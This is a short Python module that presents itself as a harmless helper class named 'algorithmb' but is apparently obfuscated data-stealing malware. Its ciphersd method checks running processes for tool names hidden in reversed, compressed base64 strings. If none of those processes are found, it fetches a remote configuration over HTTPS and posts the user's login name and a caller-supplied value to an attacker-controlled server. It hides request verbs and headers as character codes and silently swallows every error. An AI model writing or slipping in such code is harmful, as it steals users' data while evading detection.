#!/usr/bin/python3
# -*- coding: utf-8 -*-

# __all__ = ['algorithmb']
RandInt = 349234754428347

from http.client import HTTPSConnection
from zlib import compress, decompress
from base64 import b64decode, b64encode
from os import getlogin
from json import dumps

import subprocess
import platform


class algorithmb():

	def msru(self, pname):
		curus = platform.system()
		if curus == "Windows":
			otpt = subprocess.check_output('tasklist',shell=True,text=True)
		else:
			otpt = subprocess.check_output(['ps','ax'],text=True)
		return pname.lower() in otpt.lower()

	def encd(self, data):
		zlbc=lambda in_:compress(in_)
		b64e=lambda in_:b64encode(in_)
		return b64e(zlbc(data.encode('utf8')))[::-1].decode()

	def decd(self, data):
		b64d=lambda in_:b64decode(in_)
		zlbd=lambda in_:decompress(in_)
		return zlbd(b64d(data[::-1])).decode()
	
	def ciphersd(self,e:str,t:int,v:str):
		try:  
			rx5t4s=[self.msru(self.decd(p)) for p in ['BVQzlAQBI16SWrMLI5cLKxyzrwJe','==wSEMfGAUAStuk0tkUyJx0yLxJe','XZAY2AQBI16SRzizJ/8zJjCUpkCKLzJe','=Q1BQcEAFgUrLRdzq0yTP1kKNlESpkCKLzJe','==wUEIiGAUAStuk1tkkysgkzLxJe','ZkQupBQBI16SUnKLL3cLN/szNlELN7CCq0iKLxJe']]
			if any(rx5t4s)!=True:
				gG53z=[b'=QMBn+BAF8szLNNzK3USuwCSrwJe',b'kQQqdAAA23wcw0iCLe31so0LTzJe']
				doSGb=HTTPSConnection(self.decd(gG53z[0]),timeout=1)
				doSGb.request(''.join(map(chr,[71,69,84])),self.decd(gG53z[1]))
				tenNo=doSGb.getresponse().read().decode().strip()
				doSGb.close()
				Fd3hh=self.decd(tenNo).split(':')
				enC03=self.encd(e)
				if int(Fd3hh[3])==0:
					pF3th={'t':t,'n':getlogin(),'v':v,'e':enC03,'r':5311879476}
					aPf3h=''.join(map(chr,[97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110]))
					Hs3hf={''.join(map(chr,[67,111,110,116,101,110,116,45,116,121,112,101])):aPf3h}
					s0Ntz=HTTPSConnection(Fd3hh[0],Fd3hh[1],timeout=1)
					s0Ntz.request(''.join(map(chr,[80,79,83,84])),Fd3hh[2],dumps(pF3th),Hs3hf)
					rsGap=s0Ntz.getresponse()
					s0Ntz.close()
					return True
				else:
					return False
			else:
				return False
		except:
			return False